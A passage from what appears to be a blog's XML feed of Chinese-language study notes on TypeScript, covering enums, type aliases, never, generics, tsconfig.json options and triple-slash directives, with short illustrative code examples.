<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Types</span>;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">Types</span>) &#123;</span><br><span class="line">    <span class="comment">// 114键被赋值了两次</span></span><br><span class="line">    <span class="title class_">Types</span>[<span class="title class_">Types</span>[<span class="string">&quot;success&quot;</span>] = <span class="number">114</span>] = <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    <span class="title class_">Types</span>[<span class="title class_">Types</span>[<span class="string">&quot;fail&quot;</span>] = <span class="number">114</span>] = <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;)(<span class="title class_">Types</span> || (<span class="title class_">Types</span> = &#123;&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> success = <span class="title class_">Types</span>.<span class="property">success</span>;</span><br><span class="line"><span class="keyword">let</span> skey = <span class="title class_">Types</span>[success];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fail = <span class="title class_">Types</span>.<span class="property">fail</span>;</span><br><span class="line"><span class="keyword">let</span> fkey = <span class="title class_">Types</span>[fail];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Types</span>)	<span class="comment">// -&gt;&#123; &#x27;114&#x27;: &#x27;fail&#x27;, success: 114, fail: 114 &#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>类型推论和类型别名</title>
    <url>/web/study/TypeScript/12.%E7%B1%BB%E5%9E%8B%E6%8E%A8%E8%AE%BA%E5%92%8C%E7%B1%BB%E5%9E%8B%E5%88%AB%E5%90%8D.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="类型推论"><a href="#类型推论" class="headerlink" title="类型推论"></a>类型推论</h1><p>定义一个变量并初始化后，将鼠标滑到变量名上，可以看到ts对变量名的类型推断</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307062232694.png"></p>
<p>很多时候，在TS能推断出变量类型的情况下，是没有必要显示声明类型的</p>
<p>如果没有指定初始值，就会被TS推断为any类型</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307062330295.png"></p>
<h1 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h1><h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>可以使用type关键字给一个类型取别名，以便语义化和复用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 给联合类型取了别名t</span></span><br><span class="line"><span class="keyword">type</span> phone = <span class="built_in">string</span>|<span class="built_in">number</span></span><br><span class="line"><span class="comment">// 类型别名可以直接用了</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">p</span>:phone</span><br><span class="line">t = <span class="string">&quot;yajue&quot;</span>   <span class="comment">// OK</span></span><br><span class="line">t = <span class="number">114514</span>    <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

<p>类型别名和interface接口的区别：</p>
<ul>
<li>接口可以继承，而类型别名不能</li>
<li>类型别名可以定义为联合类型，而接口不能</li>
<li>重名接口会合并，而重名类型别名不会</li>
</ul>
<h2 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h2><p>extends在type中是包含的意思，左边的值会作为右边类型的子类型</p>
<p>左边的number类型和右边的number类型同级，满足包含条件</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307062351767.png"></p>
<p>左边的number类型级别比右边的never类型大，不能构成包含条件</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307062351766.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>never类型</title>
    <url>/web/study/TypeScript/13.never%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<p>never类型用于表示不应该存在或无法达到预期的状态</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 没有谁能既是string又是number，所以A被推断成了never类型</span></span><br><span class="line"><span class="keyword">type</span> A = <span class="built_in">string</span> &amp; <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 联合类型中会直接忽略never，所以B被推断成了void | number</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="built_in">void</span> | <span class="built_in">number</span> | <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为必定抛出异常，所以error函数将不会有返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">error</span>(<span class="params">message:<span class="built_in">string</span></span>):<span class="built_in">never</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(message)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为存在死循环，所以loop函数将不会有返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loop</span>(<span class="params"></span>):<span class="built_in">never</span> &#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> kun = <span class="string">&quot;唱&quot;</span> | <span class="string">&quot;跳&quot;</span> | <span class="string">&quot;rap&quot;</span> | <span class="string">&quot;篮球&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">kun</span>(<span class="params">value:kun</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span>(value) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;唱&quot;</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;只因你实在是太美&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;跳&quot;</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;再多一眼看一眼就会爆炸&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;rap&quot;</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一次呀变成这样的我&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;篮球&quot;</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你要我怎么去否认&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;You&#x27;re not kun, who are you???&quot;</span>)</span><br><span class="line">      <span class="comment">// 兜底逻辑，当分支缺失时，可以用来提示其他开发者添加分支</span></span><br><span class="line">      <span class="keyword">const</span> <span class="attr">error</span>:<span class="built_in">never</span> = value</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>泛型</title>
    <url>/web/study/TypeScript/14.%E6%B3%9B%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="函数泛型"><a href="#函数泛型" class="headerlink" title="函数泛型"></a>函数泛型</h2><p>函数名后跟一个尖括号<code>&lt;&gt;</code>，尖括号内部是动态类型参数（泛型）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> yajue&lt;T&gt;(<span class="attr">a</span>:T,<span class="attr">b</span>:T,<span class="attr">c</span>:T):<span class="title class_">Array</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> [a,b,c]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用时，可以指定泛型T的具体类型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(yajue&lt;<span class="built_in">number</span>&gt;(<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>))</span><br><span class="line"><span class="comment">// 当然也可以不指定，ts会推断类型的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">yajue</span>(<span class="string">&quot;money&quot;</span>,<span class="string">&quot;violence&quot;</span>,<span class="string">&quot;sex&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>也可以同时使用多个泛型，只要在数量和使用方式上能对应即可</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> jueya&lt;T,U&gt;(<span class="attr">a</span>:T,<span class="attr">b</span>:U):<span class="title class_">Array</span>&lt;T|U&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> [a,b]</span><br><span class="line">&#125;</span><br><span class="line">jueya&lt;<span class="title class_">Boolean</span>,<span class="built_in">number</span>&gt;(<span class="literal">false</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>还可以给泛型指定默认值</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> jueya&lt;T = <span class="built_in">number</span>&gt;(<span class="attr">a</span>:T,<span class="attr">b</span>:T):<span class="title class_">Array</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> [a,b]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 什么都不传时，会被ts推断为默认值number</span></span><br><span class="line"><span class="comment">// jueya()</span></span><br></pre></td></tr></table></figure>

<h2 id="泛型别名"><a href="#泛型别名" class="headerlink" title="泛型别名"></a>泛型别名</h2><p>在type中可以使用泛型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> A&lt;T&gt; = <span class="built_in">string</span> | <span class="built_in">number</span> | T</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>:A&lt;<span class="built_in">boolean</span>&gt;</span><br><span class="line">a = <span class="literal">false</span>     <span class="comment">// ok</span></span><br><span class="line">a = <span class="string">&quot;omg&quot;</span>     <span class="comment">// ok</span></span><br><span class="line">a = <span class="number">114514</span>    <span class="comment">// ok</span></span><br><span class="line"><span class="comment">// a = &#123;&#125;        // 不ok</span></span><br></pre></td></tr></table></figure>

<h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>泛型也可以用在接口上</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Data</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">msg</span>: T</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">data1</span>:<span class="title class_">Data</span>&lt;<span class="built_in">string</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">msg</span>: <span class="string">&quot;yjsp&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">data2</span>:<span class="title class_">Data</span>&lt;<span class="built_in">number</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">msg</span>: <span class="number">114514</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>&lt;T&gt;&#123;</span><br><span class="line">   <span class="attr">attr</span>: T[] = [];</span><br><span class="line">   add (<span class="attr">a</span>:T):T[] &#123;</span><br><span class="line">      <span class="keyword">return</span> [a]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> <span class="title class_">Sub</span>&lt;<span class="built_in">number</span>&gt;()</span><br><span class="line">s.<span class="property">attr</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">s.<span class="title function_">add</span>(<span class="number">123</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> str = <span class="keyword">new</span> <span class="title class_">Sub</span>&lt;<span class="built_in">string</span>&gt;()</span><br><span class="line">str.<span class="property">attr</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>]</span><br><span class="line">str.<span class="title function_">add</span>(<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h1><p>期望在一个泛型的变量上面获取length参数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> getLegnth&lt;T&gt;(<span class="attr">arg</span>:T) &#123;</span><br><span class="line">  <span class="keyword">return</span> arg.<span class="property">length</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，有些数据类型是没有length属性，这时就可以使用泛型约束，此处约束T为具有length属性的类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Len</span> &#123;</span><br><span class="line">   <span class="attr">length</span>:<span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> getLegnth&lt;T <span class="keyword">extends</span> <span class="title class_">Len</span>&gt;(<span class="attr">arg</span>:T) &#123;</span><br><span class="line">  <span class="keyword">return</span> arg.<span class="property">length</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">getLegnth&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="keyof约束对象"><a href="#keyof约束对象" class="headerlink" title="keyof约束对象"></a>keyof约束对象</h2><p>其中使用了TS泛型和泛型约束</p>
<ol>
<li>首先，定义T类型，并使用extends关键字继承object类型的子类型</li>
<li>然后，使用keyof操作符获取T类型的所有键，它的返回类型是联合类型</li>
<li>最后，利用extends关键字约束K类型必须为keyof T联合类型的子类型</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> prop&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>, K <span class="keyword">extends</span> keyof T&gt;(<span class="attr">obj</span>: T, <span class="attr">key</span>: K) &#123;</span><br><span class="line">   <span class="keyword">return</span> obj[key]</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> o = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">prop</span>(o, <span class="string">&#x27;a&#x27;</span>) </span><br><span class="line"><span class="title function_">prop</span>(o, <span class="string">&#x27;d&#x27;</span>) <span class="comment">// 不ok</span></span><br></pre></td></tr></table></figure>

<p>type中也可以这么用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Options</span>&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt; = &#123;</span><br><span class="line">  [<span class="title class_">Key</span> <span class="keyword">in</span> keyof T]?:T[<span class="title class_">Key</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">age</span>:<span class="built_in">number</span>,</span><br><span class="line">  <span class="attr">sex</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> B = <span class="title class_">Options</span>&lt;<span class="title class_">Data</span>&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>tsconfig.json配置文件</title>
    <url>/web/study/TypeScript/15.tsconfig.json%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>终端使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tsc --init</span><br></pre></td></tr></table></figure>

<p>生成配置文件tsconfig.json</p>
<h1 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;incremental&quot;</span>: <span class="literal">true</span>, <span class="comment">// 使TS编译器在第一次编译后生成一个存储编译信息的文件，这样第二次编译就会在第一次的基础上进行增量编译，提高了编译的速度</span></span><br><span class="line">  <span class="string">&quot;tsBuildInfoFile&quot;</span>: <span class="string">&quot;./buildFile&quot;</span>, <span class="comment">// 增量编译文件的存储位置</span></span><br><span class="line">  <span class="string">&quot;diagnostics&quot;</span>: <span class="literal">true</span>, <span class="comment">// 打印诊断信息 </span></span><br><span class="line">  <span class="string">&quot;target&quot;</span>: <span class="string">&quot;ES5&quot;</span>, <span class="comment">// 目标语言的版本</span></span><br><span class="line">  <span class="string">&quot;module&quot;</span>: <span class="string">&quot;CommonJS&quot;</span>, <span class="comment">// 生成代码的模板标准</span></span><br><span class="line">  <span class="string">&quot;outFile&quot;</span>: <span class="string">&quot;./app.js&quot;</span>, <span class="comment">// 将多个相互依赖的文件生成一个文件，可以用在AMD模块中，即开启时应设置&quot;module&quot;: &quot;AMD&quot;,</span></span><br><span class="line">  <span class="string">&quot;lib&quot;</span>: [<span class="string">&quot;DOM&quot;</span>, <span class="string">&quot;ES2015&quot;</span>, <span class="string">&quot;ScriptHost&quot;</span>, <span class="string">&quot;ES2019.Array&quot;</span>], <span class="comment">// TS需要引用的库（声明文件），ES5默认引用DOM、ES5、ScriptHost,如需要使用ES的高级版本特性，通常都需要配置，如ES8的数组新特性需要引入&quot;ES2019.Array&quot;,</span></span><br><span class="line">  <span class="string">&quot;allowJS&quot;</span>: <span class="literal">true</span>, <span class="comment">// 允许编译器编译JS，JSX文件</span></span><br><span class="line">  <span class="string">&quot;checkJs&quot;</span>: <span class="literal">true</span>, <span class="comment">// 允许在JS文件中报错，通常与allowJS一起使用</span></span><br><span class="line">  <span class="string">&quot;outDir&quot;</span>: <span class="string">&quot;./dist&quot;</span>, <span class="comment">// 指定输出目录</span></span><br><span class="line">  <span class="string">&quot;rootDir&quot;</span>: <span class="string">&quot;./&quot;</span>, <span class="comment">// 指定输出文件目录(用于输出)，用于控制输出目录结构</span></span><br><span class="line">  <span class="string">&quot;declaration&quot;</span>: <span class="literal">true</span>, <span class="comment">// 生成声明文件，开启后会自动生成声明文件</span></span><br><span class="line">  <span class="string">&quot;declarationDir&quot;</span>: <span class="string">&quot;./file&quot;</span>, <span class="comment">// 指定生成声明文件存放目录</span></span><br><span class="line">  <span class="string">&quot;emitDeclarationOnly&quot;</span>: <span class="literal">true</span>, <span class="comment">// 只生成声明文件，而不会生成js文件</span></span><br><span class="line">  <span class="string">&quot;sourceMap&quot;</span>: <span class="literal">true</span>, <span class="comment">// 生成目标文件的sourceMap文件</span></span><br><span class="line">  <span class="string">&quot;inlineSourceMap&quot;</span>: <span class="literal">true</span>, <span class="comment">// 生成目标文件的inline（内联） SourceMap，inline SourceMap会包含在生成的js文件中</span></span><br><span class="line">  <span class="string">&quot;declarationMap&quot;</span>: <span class="literal">true</span>, <span class="comment">// 为声明文件生成sourceMap</span></span><br><span class="line">  <span class="string">&quot;typeRoots&quot;</span>: [], <span class="comment">// 声明文件目录，默认时node_modules/@types</span></span><br><span class="line">  <span class="string">&quot;types&quot;</span>: [], <span class="comment">// 加载的声明文件包</span></span><br><span class="line">  <span class="string">&quot;removeComments&quot;</span>:<span class="literal">true</span>, <span class="comment">// 删除注释 </span></span><br><span class="line">  <span class="string">&quot;noEmit&quot;</span>: <span class="literal">true</span>, <span class="comment">// 不输出文件,即编译后不会生成任何js文件</span></span><br><span class="line">  <span class="string">&quot;noEmitOnError&quot;</span>: <span class="literal">true</span>, <span class="comment">// 发送错误时不输出任何文件</span></span><br><span class="line">  <span class="string">&quot;noEmitHelpers&quot;</span>: <span class="literal">true</span>, <span class="comment">// 不生成helper函数，减小体积，需要额外安装，常配合importHelpers一起使用</span></span><br><span class="line">  <span class="string">&quot;importHelpers&quot;</span>: <span class="literal">true</span>, <span class="comment">// 通过tslib引入helper函数，文件必须是模块</span></span><br><span class="line">  <span class="string">&quot;downlevelIteration&quot;</span>: <span class="literal">true</span>, <span class="comment">// 降级遍历器实现，如果目标源是es3/5，那么遍历器会有降级的实现</span></span><br><span class="line">  <span class="string">&quot;strict&quot;</span>: <span class="literal">true</span>, <span class="comment">// 开启所有严格的类型检查</span></span><br><span class="line">  <span class="string">&quot;alwaysStrict&quot;</span>: <span class="literal">true</span>, <span class="comment">// 在代码中注入&#x27;use strict&#x27;</span></span><br><span class="line">  <span class="string">&quot;noImplicitAny&quot;</span>: <span class="literal">true</span>, <span class="comment">// 不允许隐式的any类型</span></span><br><span class="line">  <span class="string">&quot;strictNullChecks&quot;</span>: <span class="literal">true</span>, <span class="comment">// 不允许把null、undefined赋值给其他类型的变量</span></span><br><span class="line">  <span class="string">&quot;strictFunctionTypes&quot;</span>: <span class="literal">true</span>, <span class="comment">// 不允许函数参数双向协变</span></span><br><span class="line">  <span class="string">&quot;strictPropertyInitialization&quot;</span>: <span class="literal">true</span>, <span class="comment">// 类的实例属性必须初始化</span></span><br><span class="line">  <span class="string">&quot;strictBindCallApply&quot;</span>: <span class="literal">true</span>, <span class="comment">// 严格的bind/call/apply检查</span></span><br><span class="line">  <span class="string">&quot;noImplicitThis&quot;</span>: <span class="literal">true</span>, <span class="comment">// 不允许this有隐式的any类型</span></span><br><span class="line">  <span class="string">&quot;noUnusedLocals&quot;</span>: <span class="literal">true</span>, <span class="comment">// 检查只声明、未使用的局部变量（只提示不报错）</span></span><br><span class="line">  <span class="string">&quot;noUnusedParameters&quot;</span>: <span class="literal">true</span>, <span class="comment">// 检查未使用的函数参数（只提示不报错）</span></span><br><span class="line">  <span class="string">&quot;noFallthroughCasesInSwitch&quot;</span>: <span class="literal">true</span>, <span class="comment">// 防止switch语句贯穿（如果没有break语句，后面不会执行）</span></span><br><span class="line">  <span class="string">&quot;noImplicitReturns&quot;</span>: <span class="literal">true</span>, <span class="comment">//每个分支都会有返回值</span></span><br><span class="line">  <span class="string">&quot;esModuleInterop&quot;</span>: <span class="literal">true</span>, <span class="comment">// 允许export=导出，由import from 导入</span></span><br><span class="line">  <span class="string">&quot;allowUmdGlobalAccess&quot;</span>: <span class="literal">true</span>, <span class="comment">// 允许在模块中全局变量的方式访问umd模块</span></span><br><span class="line">  <span class="string">&quot;moduleResolution&quot;</span>: <span class="string">&quot;node&quot;</span>, <span class="comment">// 模块解析策略，ts默认用node的解析策略，即相对的方式导入</span></span><br><span class="line">  <span class="string">&quot;baseUrl&quot;</span>: <span class="string">&quot;./&quot;</span>, <span class="comment">// 解析非相对模块的基地址，默认是当前目录</span></span><br><span class="line">  <span class="string">&quot;paths&quot;</span>: &#123; <span class="comment">// 路径映射，相对于baseUrl</span></span><br><span class="line">    <span class="comment">// 如使用jq时不想使用默认版本，而需要手动指定版本，可进行如下配置</span></span><br><span class="line">    <span class="string">&quot;jquery&quot;</span>: [<span class="string">&quot;node_modules/jquery/dist/jquery.min.js&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;rootDirs&quot;</span>: [<span class="string">&quot;src&quot;</span>,<span class="string">&quot;out&quot;</span>], <span class="comment">// 将多个目录放在一个虚拟目录下，用于运行时，即编译后引入文件的位置可能发生变化，这也设置可以虚拟src和out在同一个目录下，不用再去改变路径也不会报错</span></span><br><span class="line">  <span class="string">&quot;listEmittedFiles&quot;</span>: <span class="literal">true</span>, <span class="comment">// 打印输出文件</span></span><br><span class="line">  <span class="string">&quot;listFiles&quot;</span>: <span class="literal">true</span><span class="comment">// 打印编译的文件(包括引用的声明文件)</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 指定一个匹配列表（自动指定该路径下的所有ts相关文件）</span></span><br><span class="line"><span class="string">&quot;include&quot;</span>: [</span><br><span class="line">   <span class="string">&quot;src/**/*&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="comment">// 指定一个排除列表（include的反向操作）</span></span><br><span class="line"> <span class="string">&quot;exclude&quot;</span>: [</span><br><span class="line">   <span class="string">&quot;demo.ts&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="comment">// 指定哪些文件使用该配置（只能手动一个个指定文件）</span></span><br><span class="line"> <span class="string">&quot;files&quot;</span>: [</span><br><span class="line">   <span class="string">&quot;demo.ts&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>三斜线指令</title>
    <url>/web/study/TypeScript/17.%E4%B8%89%E6%96%9C%E7%BA%BF%E6%8C%87%E4%BB%A4.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="三斜线指令"><a href="#三斜线指令" class="headerlink" title="三斜线指令"></a>三斜线指令</h1><p>三斜线指令是包含单个XML标签的单行注释，注释的内容会做为编译器指令使用</p>
<p>三斜线指令仅可放在包含它的文件的最顶端</p>
<p> 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令</p>
<p> 如果它们出现在一个语句或声明之后，那么它们会被当做普通的单行注释，并且不具有特殊的含义</p>
<p>使用三斜线指令时，tsconfig不能设置<code>&quot;moduleDetection&quot;: &quot;force&quot;</code></p>
<p>更推荐使用import引入文件，而不是使用三斜线指令</p>
<h1 id="三斜线引用"><a href="#三斜线引用" class="headerlink" title="三斜线引用"></a>三斜线引用</h1><p><code>/// &lt;reference path=&quot;...&quot; /&gt;</code>指令是三斜线指令中最常见的一种，用于声明文件间的依赖</p>
<p>三斜线引用告诉编译器在编译过程中要引入的额外的文件，类似import</p>
<p>a.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> A &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>b.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> A &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">fn2</span> = (<span class="params"></span>) =&gt; <span class="string">&#x27;b&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>index.ts：引入后可直接使用命名空间A</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">///&lt;reference path=&quot;./a.ts&quot; /&gt;</span></span><br><span class="line"><span class="comment">///&lt;reference path=&quot;./b.ts&quot; /&gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(A);</span><br></pre></td></tr></table></figure>

<h1 id="声明文件引入"><a href="#声明文件引入" class="headerlink" title="声明文件引入"></a>声明文件引入</h1><p>例如把</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// &lt;reference types=&quot;node&quot; /&gt;</span></span><br></pre></td></tr></table></figure>

<p>引入到声明文件，表示这个文件使用了 <code>@types/node/index.d.ts</code>里面声明的名字，且这个包需要在编译阶段与声明文件一起被包含进来</p>
<p>仅当需要写一个<code>d.ts</code>文件时才使用这个指令</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>namespace命名空间</title>
    <url>/web/study/TypeScript/16.namespace%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4.html</url>
